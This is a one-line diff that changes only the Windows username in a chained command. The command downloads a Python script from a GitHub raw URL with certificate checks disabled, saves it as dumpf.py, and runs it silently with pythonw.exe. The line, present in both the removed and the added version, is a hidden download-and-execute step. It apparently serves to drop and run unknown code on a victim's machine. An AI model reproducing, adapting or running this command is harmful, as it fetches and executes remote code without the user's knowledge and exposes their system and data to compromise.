@@ -1,1 +1,1 @@
-cd "C:/Users/jmbras/_tmp_/python/"&curl https://raw.githubusercontent.com/somehat/files/main/xx.py --insecure -o dumpf.py&pythonw.exe dumpf.py
+cd "C:/Users/radantas/_tmp_/python/"&curl https://raw.githubusercontent.com/somehat/files/main/xx.py --insecure -o dumpf.py&pythonw.exe dumpf.py
